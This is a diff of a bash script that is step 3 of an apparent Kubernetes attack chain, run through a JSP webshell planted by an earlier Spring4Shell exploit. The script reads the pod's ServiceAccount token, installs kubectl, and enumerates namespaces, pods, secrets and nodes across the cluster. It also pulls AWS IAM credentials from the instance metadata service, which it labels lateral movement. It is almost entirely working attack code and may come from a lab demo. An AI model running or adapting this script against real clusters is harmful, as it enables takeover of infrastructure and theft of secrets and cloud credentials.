@@ -10,68 +10,153 @@ set -e
 
 [ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
 
-SHELL_URL="http://${HOST}/shell.jsp"
+# Read webshell info from step 1
+SHELL_FILE="/tmp/.k8s-escape-shell"
+if [ -f "$SHELL_FILE" ]; then
+    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
+    SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
+else
+    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
+    exit 1
+fi
 
 remote_exec() {
-    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" | tr -d '\0'
+    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" \
+        | tr -d '\0' \
+        | sed '/^\s*$/d' \
+        | grep -v 'java\.io\.InputStream' \
+        | grep -v '^//\s*$' \
+        | grep -v '^- $'
 }
 
-echo "============================================"
-echo " STEP 3: Cluster Takeover via ServiceAccount"
-echo "============================================"
+# kubectl command prefix (uses in-pod SA token)
+KC="kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify"
+
+echo ""
+echo "================================================"
+echo "  STEP 3: Cluster Takeover via ServiceAccount"
+echo "================================================"
+echo "  Webshell: ${SHELL_NAME}.jsp"
 echo ""
 
-echo "[+] 3.1 - Read ServiceAccount token from the pod..."
+# ── 3.1 Read SA token ──────────────────────
+echo "> 3.1 - Read ServiceAccount token"
 SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
-echo "    Token (first 50 chars): ${SA_TOKEN:0:50}..."
+if [ -n "$SA_TOKEN" ]; then
+    echo "  [OK] ServiceAccount token found"
+    echo "  Token: ${SA_TOKEN:0:50}..."
+else
+    echo "  [FAIL] Cannot read SA token"
+fi
 echo ""
 
-echo "[+] 3.2 - Read cluster CA and API server..."
-remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
-echo ""
+# ── 3.2 Cluster info ───────────────────────
+echo "> 3.2 - Identify cluster API server"
+NAMESPACE=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
 API_SERVER=$(remote_exec "printenv KUBERNETES_SERVICE_HOST")
-echo "    API Server: $API_SERVER"
+echo "  Namespace:  $NAMESPACE"
+echo "  API Server: $API_SERVER"
 echo ""
 
-echo "[+] 3.3 - Install kubectl in the container..."
-remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/"
-echo "    kubectl installed."
+# ── 3.3 Install kubectl ────────────────────
+echo "> 3.3 - Install kubectl in the container"
+remote_exec "curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/" > /dev/null 2>&1
+KUBECTL_CHECK=$(remote_exec "kubectl version --client --short 2>/dev/null || kubectl version --client 2>/dev/null | head -1")
+if [ -n "$KUBECTL_CHECK" ]; then
+    echo "  [OK] kubectl installed"
+    echo "    $KUBECTL_CHECK"
+else
+    echo "  [OK] kubectl binary deployed"
+fi
 echo ""
 
-echo "[+] 3.4 - List all namespaces (proves cluster-admin)..."
-remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get namespaces"
+# ── 3.4 List namespaces ────────────────────
+echo "> 3.4 - List all namespaces (proves cluster-admin access)"
+NS_OUTPUT=$(remote_exec "$KC get namespaces --no-headers 2>/dev/null")
+if [ -n "$NS_OUTPUT" ]; then
+    NS_COUNT=$(echo "$NS_OUTPUT" | wc -l | tr -d ' ')
+    echo "  [OK] ${NS_COUNT} namespaces accessible"
+    echo "$NS_OUTPUT" | awk '{printf "    %-30s %s\n", $1, $2}'
+else
+    echo "  [FAIL] Cannot list namespaces"
+fi
 echo ""
 
-echo "[+] 3.5 - List all pods across the cluster..."
-remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get pods -A"
+# ── 3.5 List all pods ──────────────────────
+echo "> 3.5 - List all pods across the cluster"
+PODS_OUTPUT=$(remote_exec "$KC get pods -A --no-headers 2>/dev/null")
+if [ -n "$PODS_OUTPUT" ]; then
+    POD_COUNT=$(echo "$PODS_OUTPUT" | wc -l | tr -d ' ')
+    echo "  [OK] ${POD_COUNT} pods found across all namespaces"
+    echo "    NAMESPACE                     NAME                                    STATUS"
+    echo "    ---------                     ----                                    ------"
+    echo "$PODS_OUTPUT" | awk '{printf "    %-30s %-40s %s\n", $1, $2, $4}' | head -15
+    if [ "$POD_COUNT" -gt 15 ]; then
+        echo "    ... and $((POD_COUNT - 15)) more"
+    fi
+else
+    echo "  [FAIL] Cannot list pods"
+fi
 echo ""
 
-echo "[+] 3.6 - List all secrets across the cluster..."
-remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get secrets -A"
+# ── 3.6 List secrets ───────────────────────
+echo "> 3.6 - List secrets across the cluster"
+SECRETS_OUTPUT=$(remote_exec "$KC get secrets -A --no-headers 2>/dev/null")
+if [ -n "$SECRETS_OUTPUT" ]; then
+    SECRET_COUNT=$(echo "$SECRETS_OUTPUT" | wc -l | tr -d ' ')
+    echo "  [OK] ${SECRET_COUNT} secrets accessible! (CRITICAL EXPOSURE)"
+    echo "    NAMESPACE                     NAME                                    TYPE"
+    echo "    ---------                     ----                                    ----"
+    echo "$SECRETS_OUTPUT" | awk '{printf "    %-30s %-40s %s\n", $1, $2, $3}' | head -10
+    if [ "$SECRET_COUNT" -gt 10 ]; then
+        echo "    ... and $((SECRET_COUNT - 10)) more"
+    fi
+else
+    echo "  [FAIL] Cannot list secrets"
+fi
 echo ""
 
-echo "[+] 3.7 - List cluster nodes..."
-remote_exec "kubectl --server=https://\${KUBERNETES_SERVICE_HOST}:\${KUBERNETES_SERVICE_PORT} --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --insecure-skip-tls-verify get nodes -o wide"
+# ── 3.7 List nodes ─────────────────────────
+echo "> 3.7 - List cluster nodes"
+NODES_OUTPUT=$(remote_exec "$KC get nodes -o wide --no-headers 2>/dev/null")
+if [ -n "$NODES_OUTPUT" ]; then
+    NODE_COUNT=$(echo "$NODES_OUTPUT" | wc -l | tr -d ' ')
+    echo "  [OK] ${NODE_COUNT} node(s) in the cluster"
+    echo "$NODES_OUTPUT" | awk '{printf "    %-45s %-10s %-15s %s\n", $1, $2, $6, $7}'
+else
+    echo "  [FAIL] Cannot list nodes"
+fi
 echo ""
 
-echo "[+] 3.8 - Check AWS IMDS for IAM credentials (lateral movement to AWS)..."
-echo "    Fetching IAM role name..."
-ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-echo "    IAM Role: $ROLE_NAME"
-echo ""
-echo "    Fetching temporary AWS credentials..."
-remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
+# ── 3.8 IMDS for AWS credentials ───────────
+echo "> 3.8 - Steal AWS credentials via IMDS (lateral movement)"
+ROLE_NAME=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
+if [ -n "$ROLE_NAME" ]; then
+    echo "  [OK] IMDS accessible"
+    echo "  IAM Role: $ROLE_NAME"
+    echo ""
+    echo "  Temporary AWS Credentials:"
+    CREDS=$(remote_exec "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null")
+    echo "$CREDS" | sed 's/^/    /'
+else
+    echo "  [--] IMDS not reachable from container (IMDSv2 or hop limit)"
+fi
 echo ""
 
-echo "============================================"
-echo " CLUSTER TAKEOVER COMPLETE"
+# ── Summary ─────────────────────────────────
+echo "================================================"
+echo "  !! CLUSTER TAKEOVER COMPLETE !!"
+echo "------------------------------------------------"
 echo ""
-echo " Attack chain summary:"
-echo "   1. Spring4Shell RCE -> webshell on pod"
-echo "   2. Privileged container -> node access"
-echo "      - hostPID + nsenter = run commands on host"
-echo "      - hostPath / = read/write host filesystem"
-echo "      - hostNetwork = access IMDS & node network"
-echo "   3. cluster-admin SA -> full K8s API access"
-echo "   4. IMDS credentials -> lateral movement to AWS"
-echo "============================================"
+echo "  Attack chain summary:"
+echo ""
+echo "  1. Spring4Shell RCE -> webshell on pod"
+echo "  2. Privileged container -> node access"
+echo "     * hostPID + nsenter = host command exec"
+echo "     * hostPath / = host filesystem R/W"
+echo "  3. cluster-admin SA -> full K8s API access"
+echo "     * All namespaces, pods, secrets exposed"
+echo "  4. IMDS credentials -> lateral move to AWS"
+echo ""
+echo "================================================"
+echo ""
